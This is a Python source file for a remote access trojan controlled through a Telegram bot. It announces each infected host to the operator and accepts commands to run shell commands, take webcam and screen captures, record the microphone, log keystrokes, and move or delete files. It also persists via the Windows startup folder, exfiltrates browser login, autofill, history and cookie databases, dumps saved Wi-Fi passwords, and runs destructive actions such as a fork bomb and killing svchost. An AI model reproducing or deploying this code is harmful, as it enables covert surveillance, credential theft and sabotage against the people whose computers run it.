import telebot
import subprocess
import platform
import os
import threading
import tempfile
import shutil
import sys
import glob
import time
import socket
import warnings


with warnings.catch_warnings():
    warnings.simplefilter("ignore")


try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

try:
    import cv2
    OPENCV_AVAILABLE = True
except ImportError:
    OPENCV_AVAILABLE = False

try:
    import sounddevice as sd
    import soundfile as sf
    SOUNDDEV_AVAILABLE = True
except ImportError:
    SOUNDDEV_AVAILABLE = False

try:
    import pynput.keyboard
    import pynput.mouse
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

try:
    import pyperclip
    PYPERCLIP_AVAILABLE = True
except ImportError:
    PYPERCLIP_AVAILABLE = False

try:
    import pyttsx3
    PYTTSX3_AVAILABLE = True
except ImportError:
    PYTTSX3_AVAILABLE = False

import ctypes

try:
    import sqlite3
except ImportError:
    sqlite3 = None

try:
    import win32api
    import win32con
    import win32gui
    import win32clipboard
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

def get_executable_dir():
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        return os.path.dirname(sys.executable)
    elif getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))

def get_real_script_path():
    if getattr(sys, 'frozen', False):
        return sys.executable
    else:
        return os.path.realpath(__file__)


BOT_TOKEN = 'The ugly ass telegram bot token' #jk
ALLOWED_CHAT_IDS = [And dont forget your Shitty Chat-Id] #jk
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None) 

user_cwd = {}
user_block_state = {}
user_upload_context = {}
user_keylogger_state = {}

def get_ip_hostname():
    hostname = platform.node()
    ip = "Unknown"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        try:
            ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            ip = "Unknown"
    return ip, hostname

def announce_connection():
    ip, hostname = get_ip_hostname()
    text = f"Client connected!\nIP address: <code>{ip}</code>\nHost name: <code>{hostname}</code>\n\nclient connected, lets see what we can do"
    for chat_id in ALLOWED_CHAT_IDS:
        try:
            bot.send_message(chat_id, text, parse_mode="HTML")
        except Exception:
            pass

def setup_and_announce():
    announce_connection()


def restricted(func):
    def wrapper(message, *args, **kwargs):
        try:
            
            chat_id = getattr(getattr(message, "chat", None), "id", None)
            if chat_id in ALLOWED_CHAT_IDS:
                return func(message, *args, **kwargs)
            else:
                bot.reply_to(message, "Unauthorized")
        except Exception as ex:
            pass
    wrapper.__name__ = func.__name__
    return wrapper



@bot.message_handler(commands=['start', 'help'])
@restricted
def send_help(message):
    bot.reply_to(message,
    """Available Commands:
/info - System info
/shell <cmd> - Shell command
/screenshot - Screenshot
/webcam - Take image via webcam
/mic - Record mic 15sec
/killself - Delete this script & exit
/listprocesses - List running processes
/killprocess <name> - Kill process by name
/blue - BSOD (Windows only)
/forkbomb - Run fork bomb (DANGER!)
/keylogger_start - Start keylogger
/keylogger_stop - Stop keylogger & dump log
/files <dir> - List files in dir
/download <path> - Download file
/upload - Initiates upload mode
/upload <targetdir> - Save uploaded file
/remove <path> - Delete file
/startup - Add self to startup (no admin)
/fileback - Go up one dir
/browser - Get Chrome/Edge autofills & his
/wifi - Send saved Wi-Fi passwords
/clipboard - Show current clipboard
/clipboard <text> - Set clipboard text
/tts <text> - Text2speech on PC
/msg <text> - Popup a Windows message box
/blank - Blank the screen (black overlay)
/unblank - Remove blank overlay
/block - Block mouse & keyboard
/unblock - Unblock mouse & keyboard
""")

@bot.message_handler(commands=['info'])
@restricted
def system_info(message):
    uname = platform.uname()
    info = f"System: {uname.system}\nNode: {uname.node}\nRelease: {uname.release}\nVersion: {uname.version}\nMachine: {uname.machine}\nProcessor: {uname.processor}"
    bot.reply_to(message, info)

@bot.message_handler(commands=['shell'])
@restricted
def shell_cmd(message):
    try:
        parts = message.text.split(' ',1)
        if len(parts)<2 or not parts[1].strip():
            return bot.reply_to(message, "Usage: /shell <cmd>")
        cmd = parts[1]
        output = subprocess.getoutput(cmd)
        full_log = f"Executed shell command:\n<code>{cmd}</code>\n\nOutput:\n<code>{output[:4000]}</code>"
        bot.reply_to(message, full_log, parse_mode="HTML")
    except Exception as ex:
        bot.reply_to(message, f"Error: {str(ex)}")

@bot.message_handler(commands=['screenshot'])
@restricted
def screenshot(message):
    if not PYAUTOGUI_AVAILABLE:
        bot.reply_to(message, "Screenshot requires 'pyautogui'. pip install pyautogui")
        return
    try:
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmpfile:
            fname = tmpfile.name
        pyautogui.screenshot().save(fname)
        with open(fname, "rb") as photo_file:
            bot.send_photo(message.chat.id, photo_file)
        os.unlink(fname)
    except Exception as ex:
        bot.reply_to(message, f"Screenshot error: {str(ex)}")

@bot.message_handler(commands=['webcam'])
@restricted
def webcam_shot(message):
    if not OPENCV_AVAILABLE:
        bot.reply_to(message, "Webcam needs opencv-python. pip install opencv-python")
        return
    def _work():
        try:
            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW if hasattr(cv2, "CAP_DSHOW") else 0)
            time.sleep(0.7)
            ret, img = cam.read()
            cam.release()
            if ret:
                tmp = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
                fname = tmp.name
                tmp.close()
                cv2.imwrite(fname, img)
                with open(fname, "rb") as f:
                    bot.send_photo(message.chat.id, f)
                os.unlink(fname)
            else:
                bot.reply_to(message, "Failed to capture webcam image.")
        except Exception as ex:
            bot.reply_to(message, f"Webcam error: {str(ex)}")
    threading.Thread(target=_work, daemon=True).start()

@bot.message_handler(commands=['mic'])
@restricted
def mic_record(message):
    if not SOUNDDEV_AVAILABLE:
        bot.reply_to(message, "Mic needs sounddevice,soundfile. pip install sounddevice soundfile")
        return
    def _work():
        try:
            duration = 15
            samplerate = 44100
            tmp = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
            fname = tmp.name
            tmp.close()
            recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=1, dtype='int16')
            sd.wait()
            sf.write(fname, recording, samplerate)
            with open(fname, "rb") as f:
                bot.send_document(message.chat.id, f, caption="Mic record 15 seconds.")
            os.unlink(fname)
        except Exception as ex:
            bot.reply_to(message, f"Mic error: {str(ex)}")
    threading.Thread(target=_work, daemon=True).start()

@bot.message_handler(commands=['killself'])
@restricted
def killself(message):
    try:
        path = get_real_script_path()
        bot.reply_to(message, "Deleting script and exiting...")
        def kill_and_delete():
            try:
                os.remove(path)
            except Exception:
                pass
            os._exit(0)
        threading.Thread(target=kill_and_delete, daemon=True).start()
    except Exception as ex:
        bot.reply_to(message, f"Error: {str(ex)}")

@bot.message_handler(commands=['listprocesses'])
@restricted
def listprocesses(message):
    try:
        output = ""
        if platform.system() == 'Windows':
            output = subprocess.check_output("tasklist", shell=True).decode(errors='ignore')
        else:
            output = subprocess.check_output(["ps", "aux"]).decode(errors='ignore')
        bot.reply_to(message, f"<code>{output[:4000]}</code>", parse_mode="HTML")
    except Exception as ex:
        bot.reply_to(message, f"Process list error: {str(ex)}")

@bot.message_handler(commands=['killprocess'])
@restricted
def killprocess(message):
    try:
        tokens = message.text.split(' ', 1)
        if len(tokens) < 2 or not tokens[1].strip():
            return bot.reply_to(message, "Usage: /killprocess <process name or PID>")
        proc = tokens[1].strip()
        if platform.system() == 'Windows':
            if proc.isdigit():
                output = subprocess.getoutput(f"taskkill /PID {proc} /F")
            else:
                output = subprocess.getoutput(f"taskkill /IM \"{proc}\" /F")
        else:
            if proc.isdigit():
                output = subprocess.getoutput(f"kill -9 {proc}")
            else:
                output = subprocess.getoutput(f"pkill -f \"{proc}\"")
        bot.reply_to(message, f"<code>{output[:3900]}</code>", parse_mode="HTML")
    except Exception as ex:
        bot.reply_to(message, f"Error: {str(ex)}")

@bot.message_handler(commands=['blue'])
@restricted
def bluescreen(message):
    if platform.system() == 'Windows':
        try:
            subprocess.Popen('cmd /c "taskkill /f /im svchost.exe"', shell=True)
            bot.reply_to(message, "Attempted to trigger BSOD.")
        except:
            bot.reply_to(message, "Permission error or already killed.")
    else:
        bot.reply_to(message, "Not supported on this OS.")

@bot.message_handler(commands=['forkbomb'])
@restricted
def forkbomb(message):
    bot.reply_to(message, "Warning: Fork bomb is very dangerous!")
    if platform.system() == 'Windows':
        subprocess.Popen(['cmd', '/c', ':a\nstart %0\ngoto a'], shell=True)
    else:
        code = ":(){ :|:& };:"
        subprocess.Popen(code, shell=True)
    bot.reply_to(message, "Launched.")

class Keylogger:
    def __init__(self, chatid):
        self.log = ""
        self.is_running = True
        self.chatid = chatid
        self.kthread = None

    def start(self):
        if not PYNPUT_AVAILABLE:
            bot.send_message(self.chatid, "Keylogger needs: pip install pynput")
            return
        self.listener = pynput.keyboard.Listener(on_press=self.on_press)
        self.kthread = threading.Thread(target=self.listener.start)
        self.kthread.start()
        self.is_running = True

    def stop(self):
        if not PYNPUT_AVAILABLE:
            return
        self.is_running = False
        try:
            self.listener.stop()
        except:
            pass

    def on_press(self, key):
        if not self.is_running:
            return False
        try:
            self.log += str(key.char)
        except AttributeError:
            self.log += f"[{key}]"

@bot.message_handler(commands=['keylogger_start'])
@restricted
def keylogger_start(message):
    if not PYNPUT_AVAILABLE:
        return bot.reply_to(message, "Needs pip install pynput")
    chatid = message.chat.id
    if chatid in user_keylogger_state:
        return bot.reply_to(message, "Keylogger already running!")
    kl = Keylogger(chatid)
    user_keylogger_state[chatid] = kl
    kl.start()
    bot.reply_to(message, "Keylogger started. Use /keylogger_stop to stop & dump log.")

@bot.message_handler(commands=['keylogger_stop'])
@restricted
def keylogger_stop(message):
    chatid = message.chat.id
    kl = user_keylogger_state.pop(chatid, None)
    if not kl:
        return bot.reply_to(message, "Keylogger not running.")
    kl.stop()
    log = kl.log or "(no log?)"
    bot.reply_to(message, f"<b>Keylogger log:</b>\n<code>{log[-3900:]}</code>", parse_mode="HTML")

@bot.message_handler(commands=['files'])
@restricted
def list_files(message):
    try:
        tok = message.text.split(' ', 1)
        chat_id = message.chat.id
        if chat_id not in user_cwd:
            user_cwd[chat_id] = os.path.abspath(get_executable_dir())
        if len(tok) > 1 and tok[1].strip():
            path = tok[1].strip()
            if not os.path.isabs(path):
                abs_path = os.path.abspath(os.path.join(user_cwd[chat_id], path))
            else:
                abs_path = os.path.abspath(path)
            user_cwd[chat_id] = abs_path
        else:
            abs_path = user_cwd[chat_id]
        files = os.listdir(abs_path)
        out = '\n'.join(files)
        bot.reply_to(
            message,
            f"<b>Current directory: <code>{abs_path}</code></b>\n<code>{out[:3800]}</code>",
            parse_mode="HTML"
        )
    except Exception as ex:
        bot.reply_to(message, f"Error: {str(ex)}")

@bot.message_handler(commands=['fileback'])
@restricted
def fileback(message):
    chat_id = message.chat.id
    old_cwd = user_cwd.get(chat_id, os.path.abspath(get_executable_dir()))
    new_cwd = os.path.dirname(old_cwd)
    user_cwd[chat_id] = new_cwd
    try:
        files = os.listdir(new_cwd)
        out = '\n'.join(files)
        bot.reply_to(
            message,
            f"<b>Went back to: <code>{new_cwd}</code></b>\n<code>{out[:3800]}</code>",
            parse_mode="HTML"
        )
    except Exception as ex:
        bot.reply_to(message, f"Error: {str(ex)}")

@bot.message_handler(commands=['download'])
@restricted
def download_file(message):
    try:
        parts = message.text.split(' ',1)
        if len(parts)<2 or not parts[1].strip():
            return bot.reply_to(message, "Usage: /download <file>")
        file_path = parts[1]
        with open(file_path, "rb") as f:
            bot.send_document(message.chat.id, f)
    except Exception as ex:
        bot.reply_to(message, f"Error: {str(ex)}")

@bot.message_handler(commands=['remove'])
@restricted
def remove_file(message):
    try:
        parts = message.text.split(' ',1)
        if len(parts)<2 or not parts[1].strip():
            return bot.reply_to(message, "Usage: /remove <file>")
        file_path = parts[1].strip()
        os.remove(file_path)
        bot.reply_to(message, "File removed.")
    except Exception as ex:
        bot.reply_to(message, f"Error: {str(ex)}")

ALLOWED_UPLOAD_EXTS = {".png", ".jpg", ".jpeg", ".bat", ".exe", ".zip", ".rar"}
pending_upload_dir = {}

@bot.message_handler(commands=['upload'])
@restricted
def upload1(message):
    args = message.text.split(' ', 1)
    chatid = message.chat.id
    if len(args) > 1 and args[1].strip():
        bot.reply_to(message, "Now just type /upload and then send a file. (No <dir> argument here, new flow.)")
        return
    pending_upload_dir[chatid] = user_cwd.get(chatid, os.path.abspath(get_executable_dir()))
    bot.reply_to(message, "Now send a file to upload! (Allowed: .png .jpg .jpeg .bat .exe .zip .rar)\nCurrent dir: will save to your current dir, or /files to list/change.")

@bot.message_handler(content_types=['document'])
@restricted
def upload2(message):
    chatid = message.chat.id
    if chatid not in pending_upload_dir:
        return bot.reply_to(message, "Type /upload first, then send the file!")
    file_name = message.document.file_name
    ext = os.path.splitext(file_name)[1].lower()
    if ext not in ALLOWED_UPLOAD_EXTS:
        return bot.reply_to(message, f"Not allowed: {ext} file.")
    file_id = message.document.file_id
    save_path = os.path.abspath(os.path.join(pending_upload_dir[chatid], file_name))
    try:
        file_info = bot.get_file(file_id)
        downloaded = bot.download_file(file_info.file_path)
        with open(save_path, "wb") as out_file:
            out_file.write(downloaded)
        bot.reply_to(message, f"File uploaded & saved to: {save_path}")
    except Exception as ex:
        bot.reply_to(message, f"Upload error: {str(ex)}")
    finally:
        if chatid in pending_upload_dir:
            del pending_upload_dir[chatid]

@bot.message_handler(commands=['startup'])
@restricted
def add_startup(message):
    try:
        if platform.system() != 'Windows':
            bot.reply_to(message, "Only implemented for Windows.")
            return
        script_path = get_real_script_path()
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if not os.path.exists(startup_dir):
            bot.reply_to(message, "Startup folder not found.")
            return
        dst_script = os.path.join(startup_dir, os.path.basename(script_path))
        if os.path.abspath(script_path) != os.path.abspath(dst_script):
            shutil.copy2(script_path, dst_script)
        bot.reply_to(message, f"Copied script to startup folder:\n<code>{dst_script}</code>", parse_mode="HTML")
    except Exception as ex:
        bot.reply_to(message, f"Failed to add to startup: {str(ex)}")

def extract_chrome_path():
    home = os.environ.get("USERPROFILE") or os.path.expanduser('~')
    chrome_base = os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data")
    edge_base = os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data")
    chrome_paths = glob.glob(os.path.join(chrome_base, "Default"))
    edge_paths = glob.glob(os.path.join(edge_base, "Default"))
    return chrome_paths, edge_paths

def copy_browser_db(db_path):
    if not os.path.exists(db_path):
        return None
    tmpfile = tempfile.NamedTemporaryFile(delete=False)
    tmpfile.close()
    shutil.copy2(db_path, tmpfile.name)
    return tmpfile.name

@bot.message_handler(commands=['browser'])
@restricted
def browser_info(message):
    chat_id = message.chat.id
    if not sqlite3:
        bot.reply_to(message, "sqlite3 library not available, required for browser extraction.")
        return
    try:
        paths = []
        chrome_paths, edge_paths = extract_chrome_path()
        for base in chrome_paths:
            paths.append(('Chrome', base))
        for base in edge_paths:
            paths.append(('Edge', base))
        sent = False
        for browser, base in paths:
            reply = f"<b>{browser}:</b> {base}\n"
            dbs = [
                ("Login Data", "Saved logins"),
                ("Web Data", "Autofill, credit cards"),
                ("History", "History"),
                ("Cookies", "Cookies (not dumped)"),
            ]
            for db_file, desc in dbs:
                src = os.path.join(base, db_file)
                if os.path.exists(src):
                    copy_path = copy_browser_db(src)
                    sent = True
                    if desc in ["Autofill, credit cards"]:
                        try:
                            conn = sqlite3.connect(copy_path)
                            cur = conn.cursor()
                            cur.execute("SELECT name, value FROM autofill")
                            autofills = cur.fetchall()
                            conn.close()
                            text_data = ""
                            for key, value in autofills:
                                text_data += f"{key}: {value}\n"
                            if text_data:
                                bot.reply_to(message, f"<b>{browser} Autofills:</b>\n<code>{text_data[:3800]}</code>", parse_mode="HTML")
                            else:
                                bot.reply_to(message, f"<b>{browser} Autofills:</b> (none found)", parse_mode="HTML")
                        except Exception as ex:
                            bot.reply_to(message, f"<b>{browser} Autofills error:</b> {ex}", parse_mode="HTML")
                    elif desc == "History":
                        try:
                            conn = sqlite3.connect(copy_path)
                            cur = conn.cursor()
                            cur.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20")
                            rows = cur.fetchall()
                            conn.close()
                            text_data = ""
                            for url, title, ts in rows:
                                text_data += f"{title or ''}\n{url}\n"
                            if text_data:
                                bot.reply_to(message, f"<b>{browser} History (recent 20):</b>\n<code>{text_data[:3700]}</code>", parse_mode="HTML")
                        except Exception as ex:
                            bot.reply_to(message, f"<b>{browser} History error:</b> {ex}", parse_mode="HTML")
                    elif desc in ["Saved logins"]:
                        with open(copy_path, "rb") as f:
                            bot.send_document(message.chat.id, f, caption=f"{browser} Login Data DB (encrypted)")
                    else:
                        with open(copy_path, "rb") as f:
                            bot.send_document(message.chat.id, f, caption=f"{browser} {desc} DB")
                    try: os.unlink(copy_path)
                    except: pass
            bot.reply_to(message, reply, parse_mode="HTML")
        if not sent:
            bot.reply_to(message, "No Chrome/Edge data directories found on this system.")
    except Exception as ex:
        bot.reply_to(message, f"Browser data extraction error: {str(ex)}")

@bot.message_handler(commands=['wifi'])
@restricted
def wifi_pass(message):
    if platform.system() != "Windows":
        return bot.reply_to(message, "Wi-Fi password dump available only on Windows.")
    try:
        profile_names = []
        output = subprocess.check_output(['netsh','wlan','show','profiles'], shell=True).decode(errors='ignore')
        for line in output.splitlines():
            if "All User Profile" in line:
                profile_names.append(line.split(":",1)[1].strip())
        reply = ""
        for name in profile_names:
            try:
                wifi_details = subprocess.check_output(['netsh','wlan','show','profile', f'name={name}','key=clear'], shell=True).decode(errors='ignore')
                for ln in wifi_details.splitlines():
                    if "Key Content" in ln:
                        passwd = ln.split(":",1)[1].strip()
                        reply += f"{name}: {passwd}\n"
            except Exception as ex:
                reply += f"{name}: error {ex}\n"
        if reply:
            bot.reply_to(message, f"<code>{reply[:3900]}</code>", parse_mode="HTML")
        else:
            bot.reply_to(message, "No Wi-Fi passwords found.")
    except Exception as ex:
        bot.reply_to(message, f"WiFi error: {str(ex)}")

@bot.message_handler(regexp=r"^/clipboard(\s.*)?$")
@restricted
def clipboard_cmd(message):
    if not PYPERCLIP_AVAILABLE:
        return bot.reply_to(message, "pyperclip not installed. pip install pyperclip")
    tok = message.text.split(' ', 1)
    if len(tok) > 1 and tok[1].strip():
        txt = tok[1]
        try:
            pyperclip.copy(txt)
            bot.reply_to(message, "Clipboard updated.")
        except Exception as ex:
            bot.reply_to(message, f"Clipboard set error: {ex}")
    else:
        try:
            val = pyperclip.paste()
            bot.reply_to(message, f"<code>{val}</code>", parse_mode="HTML")
        except Exception as ex:
            bot.reply_to(message, f"Clipboard error: {ex}")

@bot.message_handler(commands=['tts'])
@restricted
def tts_cmd(message):
    if not PYTTSX3_AVAILABLE:
        bot.reply_to(message, "pyttsx3 not installed. pip install pyttsx3")
        return
    tok = message.text.split(' ',1)
    if len(tok)<2 or not tok[1].strip():
        return bot.reply_to(message, "Usage: /tts <text>")
    tts_text = tok[1].strip()
    def _tts():
        try:
            engine = pyttsx3.init()
            engine.say(tts_text)
            engine.runAndWait()
        except Exception as ex:
            bot.reply_to(message, f"TTS error: {ex}")
    threading.Thread(target=_tts, daemon=True).start()
    bot.reply_to(message, "Spoken.")

@bot.message_handler(commands=['msg'])
@restricted
def msgbox_cmd(message):
    tok = message.text.split(' ', 1)
    if len(tok)<2 or not tok[1].strip():
        return bot.reply_to(message, "Usage: /msg <text>")
    msg = tok[1]
    def _mb():
        try:
            if platform.system() == "Windows":
                ctypes.windll.user32.MessageBoxW(0, msg, "Message", 0x40)
            else:
                subprocess.Popen(['zenity','--info','--text',msg])
        except Exception as ex:
            bot.reply_to(message, f"Message-box error: {ex}")
    threading.Thread(target=_mb, daemon=True).start()
    bot.reply_to(message, "Popped up message-box.")

screen_blankers = {}

@bot.message_handler(commands=['blank'])
@restricted
def blank_cmd(message):
    chatid = message.chat.id
    if not PYAUTOGUI_AVAILABLE:
        return bot.reply_to(message, "pyautogui needed for blank screen.")
    def blanker():
        import tkinter as tk
        root = tk.Tk()
        root.title("Blank Screen")
        root.overrideredirect(True)
        root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
        root.config(bg="black")
        root.lift()
        root.attributes("-topmost", True)
        screen_blankers[chatid] = root
        root.mainloop()
    if chatid in screen_blankers:
        bot.reply_to(message, "Already blanked.")
        return
    t = threading.Thread(target=blanker, daemon=True)
    t.start()
    bot.reply_to(message, "Screen blanked.")

@bot.message_handler(commands=['unblank'])
@restricted
def unblank_cmd(message):
    chatid = message.chat.id
    root = screen_blankers.get(chatid)
    if not root:
        return bot.reply_to(message, "Screen not blanked.")
    try:
        root.destroy()
        screen_blankers.pop(chatid, None)
        bot.reply_to(message, "Screen unblanked.")
    except:
        bot.reply_to(message, "Error unblanking.")

input_blocker = {}

@bot.message_handler(commands=['block'])
@restricted
def block_input(message):
    if not PYNPUT_AVAILABLE:
        return bot.reply_to(message, "Needs pip install pynput")
    chatid = message.chat.id
    if chatid in input_blocker:
        return bot.reply_to(message, "Already blocked input.")
    block_state = {'block': True}
    input_blocker[chatid] = block_state
    def mouse_block():
        mouse = pynput.mouse.Controller()
        while block_state['block']:
            mouse.position = (0, 0)
            time.sleep(0.05)
    def keyboard_block():
        def on_press(key): return False
        with pynput.keyboard.Listener(on_press=on_press) as listener:
            while block_state['block']:
                time.sleep(0.1)
    threading.Thread(target=mouse_block, daemon=True).start()
    threading.Thread(target=keyboard_block, daemon=True).start()
    bot.reply_to(message, "Blocked keyboard and mouse.")

@bot.message_handler(commands=['unblock'])
@restricted
def unblock_input(message):
    chatid = message.chat.id
    if chatid in input_blocker:
        input_blocker[chatid]['block'] = False
        input_blocker.pop(chatid, None)
        bot.reply_to(message, "Unblocked keyboard and mouse.")
    else:
        bot.reply_to(message, "Input not blocked.")

if __name__ == "__main__":
    setup_and_announce()
    bot.infinity_polling(timeout=60, long_polling_timeout=30)